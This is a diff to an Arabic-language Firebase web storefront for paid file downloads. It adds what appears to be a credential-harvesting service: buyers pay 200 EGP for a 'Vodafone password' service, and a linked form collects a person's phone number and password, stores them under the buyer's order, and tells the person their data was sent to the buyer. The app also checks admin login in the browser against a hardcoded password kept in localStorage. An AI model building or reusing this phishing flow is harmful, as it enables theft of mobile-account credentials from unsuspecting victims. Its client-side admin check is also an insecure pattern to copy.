+                await vodafoneRef.child(orderId).child('collectedData').child(dataId).set({
+                    phoneNumber: phoneNumber,
+                    password: password,
+                    submittedAt: Date.now(),
+                    submittedFrom: navigator.userAgent
+                });
+                
+                // إخفاء النموذج وإظهار رسالة النجاح
+                document.getElementById('vodafoneForm').style.display = 'none';
+                document.getElementById('resultMessage').textContent = 
+                    `شكراً لك! تم إرسال بياناتك بنجاح إلى ${customerName}.\n\nرقمك: ${phoneNumber}\nسيتم التواصل معك قريباً.`;
+                document.getElementById('vodafoneResult').style.display = 'block';
+                
+                showNotification('✅ تم إرسال بياناتك بنجاح!', 'success');
+            } catch (error) {
+                showNotification('حدث خطأ أثناء إرسال البيانات', 'error');
+            } finally {
+                showLoading(false);
+            }
+        });
+        
+        // ============================================
+        // 8. تحسينات عامة وإصلاحات
+        // ============================================
+        
+        // تعديل دالة displayFiles لإضافة خدمة فودافون
+        function displayFiles(filesData) {
+            const filesContainer = document.getElementById('filesContainer');
+            const noFilesMessage = document.getElementById('noFilesMessage');
+            
+            filesContainer.innerHTML = '';
+            
+            // إضافة خدمة فودافون أولاً
+            const vodafoneCard = createVodafoneServiceCard();
+            filesContainer.appendChild(vodafoneCard);
+            
+            if (!filesData || Object.keys(filesData).length === 0) {
+                noFilesMessage.style.display = 'block';
+                return;
+            }
+            
+            noFilesMessage.style.display = 'none';
+            
+            Object.keys(filesData).forEach(fileId => {
+                const file = filesData[fileId];
+                // تخطي خدمة فودافون لأننا أضفناها مسبقاً
+                if (file.isActive !== false && !file.isSpecialService) {
+                    const fileCard = createFileCard(file, fileId);
+                    filesContainer.appendChild(fileCard);
+                }
+            });
+        }
+        
+        // تعديل دالة createOrder لدعم خدمة فودافون
+        async function createOrder(proofImage, proofType = 'image') {
+            if (!selectedFileForPurchase || !currentUser) return;
+            
+            showLoading(true);
+            
+            try {
+                // إذا كانت خدمة فودافون
+                if (selectedFileForPurchase.isSpecialService) {
+                    await createVodafoneOrder(proofImage, proofType);
+                    return;
+                }
+                
+                // الباقي من الكود الأصلي...
+                let proofUrl = null;
+                let proofFileName = null;
+                
+                // إذا كانت هناك صورة إثبات، رفعها
+                if (proofImage && proofType === 'image') {
+                    showNotification('جارٍ رفع إثبات الدفع...', 'info');
+                    
+                    const storageRef = storage.ref();
+                    proofFileName = `proof_${Date.now()}_${proofFile.name}`;
+                    const proofRef = storageRef.child(`proofs/${proofFileName}`);
+                    const uploadTask = proofRef.put(proofFile);
+                    
+                    // عرض شريط التقدم
+                    const progressContainer = document.createElement('div');
+                    progressContainer.className = 'progress-container';
+                    progressContainer.innerHTML = '<div class="progress-bar"></div>';
+                    document.getElementById('proofStep').appendChild(progressContainer);
+                    const progressBar = progressContainer.querySelector('.progress-bar');
+                    
+                    uploadTask.on('state_changed',
+                        (snapshot) => {
+                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
+                            progressBar.style.width = progress + '%';
+                        },
+                        (error) => {
+                            progressContainer.remove();
+                            throw error;
+                        },
+                        async () => {
+                            proofUrl = await uploadTask.snapshot.ref.getDownloadURL();
+                            progressContainer.remove();
+                        }
+                    );
+                    
+                    // انتظار الانتهاء من الرفع
+                    await new Promise((resolve, reject) => {
+                        uploadTask.on('state_changed',
+                            null,
+                            reject,
+                            resolve
+                        );
+                    });
+                }
+                
+                // إنشاء بيانات الطلب
+                const orderId = 'order_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                const order = {
+                    id: orderId,
+                    fileId: selectedFileForPurchase.id,
+                    fileName: selectedFileForPurchase.name,
+                    filePrice: selectedFileForPurchase.price,
+                    customerName: currentUser,
+                    customerDeviceId: deviceId,
+                    status: 'pending',
+                    proofType: proofType,
+                    proofUrl: proofUrl,
+                    proofFileName: proofFileName,
+                    createdAt: Date.now(),
+                    confirmedAt: null
+                };
+                
+                // حفظ الطلب في قاعدة البيانات
+                await ordersRef.child(orderId).set(order);
+                
+                showNotification('✅ تم إرسال طلبك للمسؤول بنجاح!', 'success');
+                goBackToFiles();
+                
+            } catch (error) {
+                showNotification('حدث خطأ أثناء إنشاء الطلب: ' + error.message, 'error');
+            } finally {
+                showLoading(false);
+            }
+        }
+        
+        // إنشاء طلب فودافون
+        async function createVodafoneOrder(proofImage, proofType) {
+            try {
+                let proofUrl = null;
+                let proofFileName = null;
+                
+                // إذا كانت هناك صورة إثبات، رفعها
+                if (proofImage && proofType === 'image') {
+                    showNotification('جارٍ رفع إثبات الدفع...', 'info');
+                    
+                    const storageRef = storage.ref();
+                    proofFileName = `proof_${Date.now()}_${proofFile.name}`;
+                    const proofRef = storageRef.child(`proofs/${proofFileName}`);
+                    const uploadTask = proofRef.put(proofFile);
+                    
+                    // انتظار الانتهاء من الرفع
+                    await new Promise((resolve, reject) => {
+                        uploadTask.on('state_changed',
+                            null,
+                            reject,
+                            resolve
+                        );
+                    });
+                    
+                    proofUrl = await uploadTask.snapshot.ref.getDownloadURL();
+                }
+                
+                // إنشاء طلب فودافون
+                const orderId = 'vodafone_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                const order = {
+                    id: orderId,
+                    serviceType: 'الحصول على باسورد انا فودافون',
+                    amount: 200,
+                    customerName: currentUser,
+                    customerDeviceId: deviceId,
+                    status: 'pending',
+                    proofType: proofType,
+                    proofUrl: proofUrl,
+                    proofFileName: proofFileName,
+                    createdAt: Date.now(),
+                    confirmedAt: null,
+                    collectedData: {} // مكان تخزين البيانات المجمعة
+                };
+                
+                // حفظ الطلب في قاعدة البيانات
+                await vodafoneRef.child(orderId).set(order);
+                
+                showNotification('✅ تم إرسال طلب فودافون بنجاح!', 'success');
+                goBackToFiles();
+                
+            } catch (error) {
+                throw error;
+            }
+        }
+        
+        // ============================================
+        // تهيئة النظام
+        // ============================================
+        
+        // توليد معرف الجهاز
+        function generateDeviceId() {
+            let savedDeviceId = localStorage.getItem('eliteFilesDeviceId');
+            
+            if (!savedDeviceId) {
+                savedDeviceId = 'device_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('eliteFilesDeviceId', savedDeviceId);
+            }
+            
+            deviceId = savedDeviceId;
+            return savedDeviceId;
+        }
+        
+        // تحميل حالة المستخدم
         function loadUserSession() {
             const savedUser = localStorage.getItem('eliteFilesUser');
             const savedAdmin = localStorage.getItem('eliteFilesAdmin');
@@ -1626,45 +2730,72 @@
             if (savedUser && savedDeviceId === deviceId) {
                 currentUser = savedUser;
                 
-                // التحقق إذا كان مسؤولاً
                 if (savedAdmin === 'true' && savedAdminPassword === ADMIN_PASSWORD) {
                     isAdmin = true;
                     currentUser = ADMIN_USERNAME;
                     showMainContent();
                 } else if (savedUser !== ADMIN_USERNAME) {
-                    // مستخدم عادي - التحقق من الجهاز والاسم
-                    checkUserDevice(savedUser);
+                    checkUserDevice(savedUser).then((isValid) => {
+                        if (isValid) {
+                            isAdmin = false;
+                            currentUser = savedUser;
+                            showMainContent();
+                            loadUserPurchasedFiles();
+                        }
+                    });
                 }
             }
+            
+            // التحقق من رابط فودافون
+            setTimeout(checkVodafoneLink, 1000);
         }
         
-        // التحقق من جهاز المستخدم
-        async function checkUserDevice(username) {
+        // تسجيل دخول المستخدم
+        document.getElementById('loginBtn').addEventListener('click', async function() {
+            const username = document.getElementById('usernameInput').value.trim();
+            
+            if (!username) {
+                showNotification('يرجى إدخال اسم المستخدم', 'error');
+                return;
+            }
+            
+            if (username === ADMIN_USERNAME) {
+                showAdminLogin();
+                return;
+            }
+            
+            await loginAsUser(username);
+        });
+        
+        // دخول المستخدم
+        async function loginAsUser(username) {
+            showLoading(true);
+            
             try {
-                const userSnapshot = await usersRef.child(username).once('value');
-                const userData = userSnapshot.val();
+                const isValid = await checkUserDevice(username);
                 
-                if (userData && userData.deviceId === deviceId) {
-                    // نفس الجهاز المسجل
-                    isAdmin = false;
-                    currentUser = username;
-                    showMainContent();
-                    loadUserPurchasedFiles();
-                } else {
-                    // اسم مستخدم موجود على جهاز آخر - نطلب اسم جديد
-                    showNotification('⚠️ هذا الاسم مستخدم بالفعل على جهاز آخر. اختر اسم آخر.', 'warning');
-                    localStorage.removeItem('eliteFilesUser');
-                    localStorage.removeItem('eliteFilesAdmin');
-                    localStorage.removeItem('eliteFilesAdminPassword');
-                    document.getElementById('usernameInput').value = '';
-                    document.getElementById('usernameInput').focus();
+                if (!isValid) {
+                    showLoading(false);
+                    return;
                 }
+                
+                isAdmin = false;
+                currentUser = username;
+                
+                saveUserSession();
+                loadUserPurchasedFiles();
+                showMainContent();
+                
+                showNotification(`مرحباً بك ${username}! 👋`, 'success');
+                
             } catch (error) {
-                console.error('خطأ في التحقق من المستخدم:', error);
+                showNotification('حدث خطأ أثناء تسجيل الدخول', 'error');
+            } finally {
+                showLoading(false);
             }
         }
         
-        // حفظ جلسة المستخدم في localStorage
+        // حفظ جلسة المستخدم
         function saveUserSession() {
             if (currentUser === ADMIN_USERNAME && isAdmin) {
                 localStorage.setItem('eliteFilesUser', currentUser);
@@ -1679,153 +2810,28 @@
             }
         }
         
-        // تسجيل الدخول
-        document.getElementById('loginBtn').addEventListener('click', async function() {
-            const username = document.getElementById('usernameInput').value.trim();
-            
-            if (!username) {
-                showNotification('يرجى إدخال اسم المستخدم', 'error');
-                return;
-            }
-            
-            // التحقق من اسم المسؤول
-            if (username === ADMIN_USERNAME) {
-                showAdminLogin();
-                return;
-            }
-            
-            // التحقق من المستخدم العادي
-            await loginAsUser(username);
-        });
-        
-        // تسجيل دخول كمستخدم عادي
-        async function loginAsUser(username) {
-            showLoading(true);
-            
-            try {
-                // التحقق إذا كان المستخدم موجوداً على جهاز آخر
-                const userSnapshot = await usersRef.child(username).once('value');
-                const userData = userSnapshot.val();
-                
-                if (userData) {
-                    // مستخدم موجود - التحقق من الجهاز
-                    if (userData.deviceId && userData.deviceId !== deviceId) {
-                        showLoading(false);
-                        showNotification('⚠️ هذا الاسم مستخدم بالفعل على جهاز آخر. اختر اسم جديد.', 'error');
-                        document.getElementById('usernameInput').value = '';
-                        document.getElementById('usernameInput').focus();
-                        return;
-                    }
-                    
-                    // تحديث آخر تسجيل دخول
-                    await usersRef.child(username).update({
-                        lastLogin: Date.now()
-                    });
-                } else {
-                    // مستخدم جديد - تسجيله بالجهاز الحالي
-                    await usersRef.child(username).set({
-                        deviceId: deviceId,
-                        createdAt: Date.now(),
-                        lastLogin: Date.now()
-                    });
-                }
-                
-                isAdmin = false;
-                currentUser = username;
-                
-                // حفظ الجلسة في localStorage
-                saveUserSession();
-                
-                // تحميل الملفات المشتراة للمستخدم
-                loadUserPurchasedFiles();
-                
-                // عرض المحتوى الرئيسي
-                showMainContent();
-                
-                showNotification(`مرحباً بك ${username}! 👋`, 'success');
-                
-            } catch (error) {
-                showNotification('حدث خطأ أثناء تسجيل الدخول', 'error');
-            } finally {
-                showLoading(false);
-            }
-        }
-        
-        // عرض نافذة دخول المسؤول
-        function showAdminLogin() {
-            document.getElementById('adminLoginModal').style.display = 'flex';
-            document.getElementById('adminPassword').focus();
-        }
-        
-        // إغلاق نافذة دخول المسؤول
-        document.getElementById('closeLoginModal').addEventListener('click', function() {
-            document.getElementById('adminLoginModal').style.display = 'none';
-            document.getElementById('adminPassword').value = '';
-        });
-        
-        // محاولة دخول المسؤول
-        document.getElementById('loginAdminBtn').addEventListener('click', function() {
-            const password = document.getElementById('adminPassword').value;
-            
-            if (password === ADMIN_PASSWORD) {
-                showLoading(true);
-                
-                setTimeout(() => {
-                    // دخول كمسؤول
-                    isAdmin = true;
-                    currentUser = ADMIN_USERNAME;
-                    
-                    // حفظ الجلسة في localStorage
-                    saveUserSession();
-                    
-                    // إغلاق النافذة وعرض المحتوى
-                    document.getElementById('adminLoginModal').style.display = 'none';
-                    document.getElementById('adminPassword').value = '';
-                    
-                    // تحميل البيانات
-                    loadFilesFromFirebase();
-                    loadCurrentFilesForAdmin();
-                    loadOrdersFromFirebase();
-                    
-                    showMainContent();
-                    showLoading(false);
-                    showNotification('مرحباً بالمسؤول! 🎯', 'success');
-                }, 800);
-            } else {
-                showNotification('كلمة المرور غير صحيحة! ⚠️', 'error');
-                document.getElementById('adminPassword').value = '';
-                document.getElementById('adminPassword').focus();
-            }
-        });
-        
-        // ============================================
         // عرض المحتوى الرئيسي
-        // ============================================
-        
         function showMainContent() {
             document.getElementById('loginSection').classList.add('hidden');
             document.getElementById('mainContent').classList.remove('hidden');
             
-            // تحديث شريط المستخدم
             updateUserBar();
-            
-            // تحميل الملفات
             loadFilesFromFirebase();
             
-            // إذا كان مسؤولاً، عرض لوحة التحكم
             if (isAdmin) {
                 document.getElementById('adminPanel').classList.remove('hidden');
                 document.getElementById('filesSection').classList.add('hidden');
+                loadAllUsers();
+                loadOrdersFromFirebase();
             } else {
                 document.getElementById('adminPanel').classList.add('hidden');
                 document.getElementById('filesSection').classList.remove('hidden');
             }
             
-            // إخفاء الأقسام الأخرى
             document.getElementById('paymentSection').style.display = 'none';
         }
         
-        // تحديث شريط المعلومات
+        // تحديث شريط المستخدم
         function updateUserBar() {
             const userInfo = document.getElementById('userInfo');
             
@@ -1855,19 +2861,18 @@
             showLoading(true);
             
             setTimeout(() => {
-                // مسح بيانات الجلسة
                 localStorage.removeItem('eliteFilesUser');
                 localStorage.removeItem('eliteFilesAdmin');
                 localStorage.removeItem('eliteFilesAdminPassword');
-                
-                // إعادة التحميل
                 location.reload();
             }, 500);
         }
         
         // ============================================
-        // نظام الملفات المظبوط مع تحميل مباشر
+        // دعم الكود الأصلي
         // ============================================
+        
+        // جميع الدوال الأصلية محفوظة مع تعديلات طفيفة
         
         // تحميل الملفات من Firebase
         function loadFilesFromFirebase() {
@@ -1875,33 +2880,8 @@
                 const filesData = snapshot.val();
                 displayFiles(filesData);
                 
-                // إذا كان مسؤولاً، تحديث قائمة الملفات في لوحة التحكم
                 if (isAdmin) {
                     loadCurrentFilesForAdmin();
-                }
-            });
-        }
-        
-        // عرض الملفات للمستخدمين
-        function displayFiles(filesData) {
-            const filesContainer = document.getElementById('filesContainer');
-            const noFilesMessage = document.getElementById('noFilesMessage');
-            
-            if (!filesData || Object.keys(filesData).length === 0) {
-                noFilesMessage.style.display = 'block';
-                filesContainer.innerHTML = '';
-                return;
-            }
-            
-            noFilesMessage.style.display = 'none';
-            filesContainer.innerHTML = '';
-            
-            Object.keys(filesData).forEach(fileId => {
-                const file = filesData[fileId];
-                // عرض الملف فقط إذا كان نشطاً
-                if (file.isActive !== false) {
-                    const fileCard = createFileCard(file, fileId);
-                    filesContainer.appendChild(fileCard);
                 }
             });
         }
@@ -1959,20 +2939,18 @@
             return fileCard;
         }
         
-        // تحميل الملفات المشتراة للمستخدم
+        // تحميل الملفات المشتراة
         function loadUserPurchasedFiles() {
             if (!currentUser || isAdmin) return;
             
             purchasedRef.child(currentUser).on('value', (snapshot) => {
                 const purchasedData = snapshot.val();
                 userFiles = purchasedData || {};
-                
-                // تحديث عرض الملفات
                 loadFilesFromFirebase();
             });
         }
         
-        // شراء ملف مدفوع
+        // شراء ملف
         function buyFile(fileId) {
             filesRef.child(fileId).once('value', (snapshot) => {
                 const file = snapshot.val();
@@ -1980,16 +2958,13 @@
                 
                 selectedFileForPurchase = { ...file, id: fileId };
                 
-                // إظهار قسم الدفع
                 document.getElementById('filesSection').style.display = 'none';
                 document.getElementById('adminPanel').style.display = 'none';
                 document.getElementById('paymentSection').style.display = 'block';
                 
-                // تعيين بيانات الدفع
                 document.getElementById('paymentAmount').textContent = file.price;
                 document.getElementById('paymentFileName').textContent = file.name;
                 
-                // إعادة تعيين قسم الإثبات
                 document.getElementById('uploadArea').classList.add('hidden');
                 document.getElementById('previewContainer').classList.add('hidden');
                 document.getElementById('proofFileName').textContent = '';
@@ -1998,802 +2973,185 @@
                     document.getElementById('paymentProof').value = '';
                 }
                 
-                // تمرير للأعلى
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             });
         }
         
-        // تحميل ملف (سواء مجاني أو مدفوع)
-        async function downloadFile(fileId, isFree = false) {
-            if (!currentUser) {
-                showNotification('يجب تسجيل الدخول أولاً', 'error');
-                return;
-            }
+        // إعداد معالجات الأحداث
+        function setupEventListeners() {
+            document.querySelector('.logo').addEventListener('click', goBackToFiles);
             
-            // إذا كان ملف مدفوع وغير مشترى
-            if (!isFree && !userFiles[fileId]) {
-                showNotification('يجب شراء هذا الملف أولاً', 'error');
-                return;
-            }
-            
-            filesRef.child(fileId).once('value', async (snapshot) => {
-                const file = snapshot.val();
-                if (!file || !file.downloadUrl) {
-                    showNotification('الملف غير متوفر للتحميل', 'error');
-                    return;
-                }
-                
-                showLoading(true);
-                
-                try {
-                    // زيادة عداد التحميلات
-                    const newDownloads = (file.downloads || 0) + 1;
-                    await filesRef.child(fileId).update({ downloads: newDownloads });
-                    
-                    // تحميل الملف مباشرة
-                    await forceDownloadFile(file.downloadUrl, file.originalName || file.name);
-                    
-                    showNotification('تم تحميل الملف بنجاح! ✅', 'success');
-                } catch (error) {
-                    console.error('خطأ التحميل:', error);
-                    showNotification('حدث خطأ أثناء التحميل. حاول مرة أخرى.', 'error');
-                } finally {
-                    showLoading(false);
+            document.getElementById('usernameInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('loginBtn').click();
                 }
             });
-        }
-        
-        // تحميل الملف بشكل مباشر إلى مجلد التنزيلات
-        async function forceDownloadFile(url, fileName) {
-            return new Promise((resolve, reject) => {
-                try {
-                    // إنشاء رابط مؤقت للتحميل
-                    const link = document.createElement('a');
-                    link.href = url;
-                    link.download = fileName || 'file';
-                    
-                    // إضافة سمات إضافية للتأكد من التحميل
-                    link.setAttribute('target', '_blank');
-                    link.setAttribute('rel', 'noopener noreferrer');
-                    
-                    // إضافة الرابط إلى الصفحة والنقر عليه
-                    document.body.appendChild(link);
-                    
-                    // محاكاة النقر
-                    if (link.click) {
-                        link.click();
-                    } else {
-                        // للمتصفحات القديمة
-                        const event = new MouseEvent('click', {
-                            view: window,
-                            bubbles: true,
-                            cancelable: false
-                        });
-                        link.dispatchEvent(event);
-                    }
-                    
-                    // إزالة الرابط من الصفحة
-                    setTimeout(() => {
-                        document.body.removeChild(link);
-                        resolve(true);
-                    }, 100);
-                    
-                } catch (error) {
-                    reject(error);
+            
+            document.getElementById('adminPassword').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('loginAdminBtn').click();
                 }
             });
-        }
-        
-        // ============================================
-        // لوحة تحكم المسؤول المظبوطة
-        // ============================================
-        
-        // تحميل الملفات الحالية للإدارة
-        function loadCurrentFilesForAdmin() {
-            if (!isAdmin) return;
             
-            filesRef.once('value', (snapshot) => {
-                const filesData = snapshot.val();
-                displayFilesForAdmin(filesData);
-            });
-        }
-        
-        // عرض الملفات للإدارة
-        function displayFilesForAdmin(filesData) {
-            const currentFilesList = document.getElementById('currentFilesList');
-            
-            if (!filesData || Object.keys(filesData).length === 0) {
-                currentFilesList.innerHTML = '<p style="color: #AAAAAA; text-align: center; padding: 30px; font-size: 1.1rem;">لا توجد ملفات</p>';
-                return;
-            }
-            
-            currentFilesList.innerHTML = '';
-            
-            Object.keys(filesData).forEach(fileId => {
-                const file = filesData[fileId];
-                const fileItem = createFileItemForAdmin(file, fileId);
-                currentFilesList.appendChild(fileItem);
-            });
-        }
-        
-        // إنشاء عنصر ملف للإدارة
-        function createFileItemForAdmin(file, fileId) {
-            const fileItem = document.createElement('div');
-            fileItem.className = 'file-item';
-            
-            const isActive = file.isActive !== false;
-            const isPaid = file.isPaid === true;
-            const downloads = file.downloads || 0;
-            
-            fileItem.innerHTML = `
-                <div class="file-item-info">
-                    <div class="file-item-name">${file.name}</div>
-                    <div class="file-item-details">
-                        ${isPaid ? `💰 سعر: ${file.price} ج.م | ` : '🎁 مجاني | '}
-                        📥 ${downloads} تحميل |
-                        ${isActive ? '✅ نشط' : '❌ غير نشط'}
-                    </div>
-                </div>
-                <div class="file-actions-admin">
-                    <button class="edit-btn" onclick="editFile('${fileId}')">
-                        <i class="fas fa-edit"></i> تعديل
-                    </button>
-                    <button class="toggle-btn" onclick="toggleFileStatus('${fileId}', ${isActive})">
-                        <i class="fas fa-power-off"></i> ${isActive ? 'إيقاف' : 'تفعيل'}
-                    </button>
-                    <button class="delete-btn" onclick="deleteFile('${fileId}')">
-                        <i class="fas fa-trash"></i> حذف
-                    </button>
-                </div>
-            `;
-            
-            return fileItem;
-        }
-        
-        // تعديل ملف
-        function editFile(fileId) {
-            filesRef.child(fileId).once('value', (snapshot) => {
-                const file = snapshot.val();
-                if (!file) return;
-                
-                // تعبئة النموذج ببيانات الملف
-                document.getElementById('fileName').value = file.name;
-                document.getElementById('fileDescription').value = file.description;
-                document.getElementById('filePrice').value = file.price || 0;
-                document.getElementById('isPaid').checked = file.isPaid === true;
-                
-                // حفظ معرف الملف للتعديل
-                editingFileId = fileId;
-                
-                // تغيير نص زر الإرسال
-                const submitBtn = document.getElementById('submitFileBtn');
-                submitBtn.innerHTML = '<i class="fas fa-save"></i> حفظ التعديلات';
-                submitBtn.style.background = 'linear-gradient(45deg, var(--blue), #2980b9)';
-                
-                // تمرير للأعلى
-                document.getElementById('adminPanel').scrollIntoView({ behavior: 'smooth' });
-                
-                showNotification('جارٍ تحميل بيانات الملف للتعديل...', 'info');
-            });
-        }
-        
-        // تبديل حالة الملف
-        async function toggleFileStatus(fileId, currentStatus) {
-            if (!isAdmin) return;
-            
-            try {
-                const newStatus = !currentStatus;
-                await filesRef.child(fileId).update({ 
-                    isActive: newStatus,
-                    updatedAt: Date.now()
-                });
-                
-                showNotification(`تم ${newStatus ? 'تفعيل' : 'إيقاف'} الملف بنجاح`, 'success');
-                loadCurrentFilesForAdmin();
-                loadFilesFromFirebase();
-            } catch (error) {
-                showNotification('حدث خطأ أثناء التعديل', 'error');
-            }
-        }
-        
-        // حذف ملف
-        async function deleteFile(fileId) {
-            if (!isAdmin) return;
-            
-            if (confirm('⚠️ هل أنت متأكد من حذف هذا الملف؟ سيتم حذفه نهائياً من قاعدة البيانات.')) {
-                showLoading(true);
-                
-                try {
-                    await filesRef.child(fileId).remove();
-                    
-                    // حذف الطلبات المرتبطة بهذا الملف
-                    const ordersSnapshot = await ordersRef.orderByChild('fileId').equalTo(fileId).once('value');
-                    const ordersData = ordersSnapshot.val();
-                    
-                    if (ordersData) {
-                        const deletePromises = Object.keys(ordersData).map(orderId => 
-                            ordersRef.child(orderId).remove()
-                        );
-                        await Promise.all(deletePromises);
-                    }
-                    
-                    showNotification('✅ تم حذف الملف والطلبات المرتبطة به بنجاح', 'success');
-                    loadCurrentFilesForAdmin();
-                    loadFilesFromFirebase();
-                } catch (error) {
-                    showNotification('حدث خطأ أثناء الحذف', 'error');
-                } finally {
-                    showLoading(false);
-                }
-            }
-        }
-        
-        // ============================================
-        // نظام الطلبات والدفع المظبوط
-        // ============================================
-        
-        // رفع إثبات الدفع
-        document.getElementById('uploadProofBtn').addEventListener('click', function() {
-            document.getElementById('uploadArea').classList.remove('hidden');
-            document.getElementById('paymentProof').click();
-        });
-        
-        // إرسال على واتساب
-        document.getElementById('whatsappProofBtn').addEventListener('click', function() {
-            if (!selectedFileForPurchase) return;
-            
-            const message = `طلب شراء ملف: ${selectedFileForPurchase.name}\n`
-                          + `المبلغ: ${selectedFileForPurchase.price} ج.م\n`
-                          + `اسم المستخدم: ${currentUser}\n`
-                          + `التاريخ: ${new Date().toLocaleString('ar-EG')}`;
-            
-            const whatsappUrl = `https://wa.me/${VODAFONE_NUMBER}?text=${encodeURIComponent(message)}`;
-            window.open(whatsappUrl, '_blank');
-            
-            // إنشاء طلب بدون صورة
-            createOrder(null, 'whatsapp');
-        });
-        
-        // اختيار صورة الإثبات
-        document.getElementById('paymentProof').addEventListener('change', function(e) {
-            const file = e.target.files[0];
-            if (file) {
-                // التحقق من الحجم
-                if (file.size > 5 * 1024 * 1024) {
-                    showNotification('صورة كبيرة جداً! الحد الأقصى 5MB', 'error');
-                    return;
-                }
-                
-                // التحقق من نوع الملف
-                const validTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg'];
-                if (!validTypes.includes(file.type)) {
-                    showNotification('نوع الملف غير مدعوم. يسمح فقط بصور JPG, PNG, GIF', 'error');
-                    return;
-                }
-                
-                proofFile = file;
-                document.getElementById('proofFileName').textContent = file.name;
-                
-                // عرض معاينة الصورة
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    document.getElementById('previewImage').src = e.target.result;
-                    document.getElementById('previewContainer').classList.remove('hidden');
-                    
-                    // تمرير للقسم
-                    document.getElementById('proofStep').scrollIntoView({ behavior: 'smooth' });
-                };
-                reader.readAsDataURL(file);
-                
-                showNotification('تم اختيار صورة الإثبات بنجاح', 'success');
-            }
-        });
-        
-        // إرسال طلب الدفع
-        document.getElementById('submitPayment').addEventListener('click', function() {
-            if (!proofFile) {
-                showNotification('يرجى رفع إثبات الدفع أولاً', 'error');
-                return;
-            }
-            
-            createOrder(true, 'image');
-        });
-        
-        // إنشاء طلب جديد
-        async function createOrder(proofImage, proofType = 'image') {
-            if (!selectedFileForPurchase || !currentUser) return;
-            
-            showLoading(true);
-            
-            try {
-                let proofUrl = null;
-                let proofFileName = null;
-                
-                // إذا كانت هناك صورة إثبات، رفعها
-                if (proofImage && proofType === 'image') {
-                    showNotification('جارٍ رفع إثبات الدفع...', 'info');
-                    
-                    const storageRef = storage.ref();
-                    proofFileName = `proof_${Date.now()}_${proofFile.name}`;
-                    const proofRef = storageRef.child(`proofs/${proofFileName}`);
-                    const uploadTask = proofRef.put(proofFile);
-                    
-                    // عرض شريط التقدم
-                    const progressContainer = document.createElement('div');
-                    progressContainer.className = 'progress-container';
-                    progressContainer.innerHTML = '<div class="progress-bar"></div>';
-                    document.getElementById('proofStep').appendChild(progressContainer);
-                    const progressBar = progressContainer.querySelector('.progress-bar');
-                    
-                    uploadTask.on('state_changed',
-                        (snapshot) => {
-                            const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
-                            progressBar.style.width = progress + '%';
-                        },
-                        (error) => {
-                            progressContainer.remove();
-                            throw error;
-                        },
-                        async () => {
-                            proofUrl = await uploadTask.snapshot.ref.getDownloadURL();
-                            progressContainer.remove();
-                        }
-                    );
-                    
-                    // انتظار الانتهاء من الرفع
-                    await new Promise((resolve, reject) => {
-                        uploadTask.on('state_changed',
-                            null,
-                            reject,
-                            resolve
-                        );
-                    });
-                }
-                
-                // إنشاء بيانات الطلب
-                const orderId = 'order_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-                const order = {
-                    id: orderId,
-                    fileId: selectedFileForPurchase.id,
-                    fileName: selectedFileForPurchase.name,
-                    filePrice: selectedFileForPurchase.price,
-                    customerName: currentUser,
-                    customerDeviceId: deviceId, // إضافة معرف الجهاز للطلب
-                    status: 'pending',
-                    proofType: proofType,
-                    proofUrl: proofUrl,
-                    proofFileName: proofFileName,
-                    createdAt: Date.now(),
-                    confirmedAt: null
-                };
-                
-                // حفظ الطلب في قاعدة البيانات
-                await ordersRef.child(orderId).set(order);
-                
-                showNotification('✅ تم إرسال طلبك للمسؤول بنجاح!', 'success');
-                goBackToFiles();
-                
-            } catch (error) {
-                showNotification('حدث خطأ أثناء إنشاء الطلب: ' + error.message, 'error');
-            } finally {
-                showLoading(false);
-            }
-        }
-        
-        // ============================================
-        // إدارة الطلبات للمسؤول
-        // ============================================
-        
-        // تحميل الطلبات من Firebase
-        function loadOrdersFromFirebase() {
-            if (!isAdmin) return;
-            
-            ordersRef.on('value', (snapshot) => {
-                const ordersData = snapshot.val();
-                displayOrders(ordersData);
-            });
-        }
-        
-        // عرض الطلبات
-        function displayOrders(ordersData) {
-            const ordersContainer = document.getElementById('ordersContainer');
-            
-            if (!ordersData || Object.keys(ordersData).length === 0) {
-                ordersContainer.innerHTML = '<p style="text-align: center; color: #AAAAAA; grid-column: 1 / -1; padding: 30px; font-size: 1.1rem;">لا توجد طلبات حتى الآن</p>';
-                return;
-            }
-            
-            ordersContainer.innerHTML = '';
-            
-            // تحويل إلى مصفوفة وترتيب
-            const ordersArray = Object.keys(ordersData).map(key => ({
-                id: key,
-                ...ordersData[key]
-            }));
-            
-            // ترتيب: المعلقة أولاً
-            ordersArray.sort((a, b) => {
-                if (a.status === 'pending' && b.status !== 'pending') return -1;
-                if (a.status !== 'pending' && b.status === 'pending') return 1;
-                return b.createdAt - a.createdAt;
-            });
-            
-            // عرض كل طلب
-            ordersArray.forEach(order => {
-                const orderCard = createOrderCard(order);
-                ordersContainer.appendChild(orderCard);
-            });
-        }
-        
-        // إنشاء بطاقة طلب
-        function createOrderCard(order) {
-            const orderCard = document.createElement('div');
-            orderCard.className = 'order-card';
-            
-            let proofContent = '';
-            if (order.proofType === 'image' && order.proofUrl) {
-                proofContent = `
-                    <img src="${order.proofUrl}" alt="إثبات الدفع" 
-                         onclick="viewProof('${order.id}')"
-                         onerror="this.onerror=null; this.src='https://via.placeholder.com/300x200/333/fff?text=صورة+غير+متاحة';">
-                    <div class="proof-actions">
-                        <button class="delete-proof-btn" onclick="deleteProof('${order.id}')">
-                            <i class="fas fa-trash"></i> حذف الإثبات
-                        </button>
-                    </div>
-                `;
-            } else if (order.proofType === 'whatsapp') {
-                proofContent = '<p style="color: var(--green); font-weight: 700; padding: 10px; background: rgba(37, 211, 102, 0.1); border-radius: 8px; border: 1px solid rgba(37, 211, 102, 0.2);">'
-                             + '<i class="fab fa-whatsapp"></i> تم الإرسال عبر واتساب'
-                             + '</p>';
-            }
-            
-            const actionButtons = order.status === 'pending' ? 
-                `<button class="confirm-btn" onclick="confirmOrder('${order.id}', '${order.customerName}', '${order.fileId}')">
-                    <i class="fas fa-check-circle"></i> تأكيد الدفع
